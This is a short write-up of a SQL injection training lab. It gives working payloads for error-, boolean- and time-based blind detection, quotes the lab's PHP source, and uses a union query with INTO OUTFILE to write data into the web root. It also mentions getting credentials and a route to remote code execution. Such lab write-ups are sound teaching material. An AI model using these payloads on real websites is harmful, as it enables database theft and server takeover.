### **Lab - 0x05**

**Detection Payload:**
1. Used backslash `\` to check whether our input treated as int string (single or double) or within `()`.
2. Got error message, `You have an error in your SQL syntax`. It doesn't actually say how exactly is our input being wrapped or treated as.
3. Therefore, I actually went ahead and tried to wrap it under various payloads, untill `-1')) or 1=1--+` (showed `You are in.... Use outfile......` because 1=1 is true)
4. `-1')) or 1=2--+` (Showed ` You have an error in your SQL syntax `, because 1=2 is false)
5. `-1')) union select (select if(0x01=0x01, sleep(5), null)),0x00,0x00--+` Server delay for 5000 miliseconds.
6. `-1')) union select (select if(0x01<0x02, sleep(5), null)),0x00,0x00--+` Server delay for 5000 miliseconds.
6. `-1')) union select (select if(0x01>0x02, sleep(5), null)),0x00,0x00--+` No delay, then a final test.
7. `-1')) union select (select if(0x01=0x02, sleep(5), null)),0x00,0x00--+` No delay, this confirms `Boolean-based blind SQL injection (SQLi)` and `Time-based blind SQL injection`.
---

This is a tricky lab too, because even if you enter right query, it'll show there is an error in your sql syntax, the thing is, that error is custom, it executes if the `mysql_fetch_array` function in PHP which is used to retrieve a single row of data failed to return any. If I check at the source code, it has:-
```php
$row = mysql_fetch_array($result);

if($row)
{
    echo '<font color= "#FFFF00">';	
  	echo 'You are in.... Use outfile......';
  	echo "<br>";
  	echo "</font>";
} else  {
	echo '<font color= "#FFFF00">';
	echo 'You have an error in your SQL syntax';
	// print_r(mysql_error());
	echo "</font>";  
}
```
As you can see, it prints custom error message and actually the `print_r(mysql_error());` is commented, which prints the actual error message.
Therefore, I actually uncommented this and from the lab's goal `You are in.... Use outfile......` and previous labs payload crafting, I crafted this payload, `-1')) union select group_concat(table_name), NULL, NULL from information_schema.tables where table_schema='security' INTO OUTFILE 'C:/xampp/htdocs/tbl_name.txt'--+`, then it printed me the error, `File 'C:/xampp/htdocs/tbl_name.txt' already exists`, now it's crystal clear why my file wasn't being created.

Therefore, I changed the name of the file and now, there was no error being generated by `print_r(mysql_error())`, hence, I visited the file and got credentials and same process for RCE.